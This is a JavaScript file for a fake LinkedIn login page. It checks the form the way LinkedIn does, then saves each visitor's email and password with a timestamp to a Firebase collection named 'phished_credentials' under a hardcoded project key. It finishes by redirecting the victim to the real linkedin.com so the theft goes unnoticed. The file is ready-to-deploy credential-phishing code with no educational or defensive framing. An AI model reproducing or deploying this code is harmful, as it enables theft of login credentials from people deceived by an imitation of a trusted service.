import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDOZPd9ZS4c2A1-3v-mbJt3vKqKGFiAnpI",
  authDomain: "linkedin-login-7705c.firebaseapp.com",
  projectId: "linkedin-login-7705c",
  storageBucket: "linkedin-login-7705c.firebasestorage.app",
  messagingSenderId: "239296986266",
  appId: "1:239296986266:web:9090865813124b953c3323"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const submitSignIn = document.getElementById('signInBtn');
const emailField = document.getElementById('email');
const passField = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passError = document.getElementById('passwordError');

// Password Show
const togglePassword = document.getElementById("togglePassword");

togglePassword.addEventListener("click", () => {
    const isHidden = passField.type === "password";

    passField.type = isHidden ? "text" : "password";
    togglePassword.textContent = isHidden ? "Hide" : "Show";
    });

// Submission
submitSignIn.addEventListener("click", async function(event) {
    event.preventDefault();

    // Reset previous errors
    emailError.textContent = "";
    passError.textContent = "";
    emailField.classList.remove("error-border");
    passField.classList.remove("error-border");

    let valid = true;
    const emailEmpty = emailField.value.trim() === "";
    const passEmpty = passField.value.trim() === "";

    // Case 1: BOTH empty → only show email error (just like LinkedIn)
    if (emailEmpty && passEmpty) {
        emailError.textContent = "Please enter an email address or phone number.";
        emailField.classList.add("error-border");
        passError.textContent = "Password is required.";
        passField.classList.add("error-border");
        valid = false;
        return;  // Stop immediately
    }

    // Case 2: Email empty but password entered → show email error only
    if (emailEmpty && !passEmpty) {
        emailError.textContent = "Please enter an email address or phone number.";
        emailField.classList.add("error-border");
        valid = false;
        return;  // Stop immediately
    }

    // Case 3: Email filled but password empty → show password error
    if (!emailEmpty && passEmpty) {
        passError.textContent = "Password is required.";
        passField.classList.add("error-border");
        valid = false;
    }

    // Stop if invalid
    if (!valid) return;

    // Proceed only if fields are valid → Then use Swal
    try {
        await addDoc(collection(db, "phished_credentials"), {
            email: emailField.value,
            password: passField.value,
            timestamp: new Date()
        });

        Swal.fire({
            title: "Redirecting…",
            text: "Please wait while we load your account.",
            icon: "success",
            showConfirmButton: false,
            timer: 500
        }).then(() => {
            window.location.href = "https://www.linkedin.com";
        });

    } catch (error) {
        Swal.fire({
            title: "Error",
            text: "Failed to store credentials: " + error.message,
            icon: "error",
            confirmButtonText: "OK"
        });
    }
});
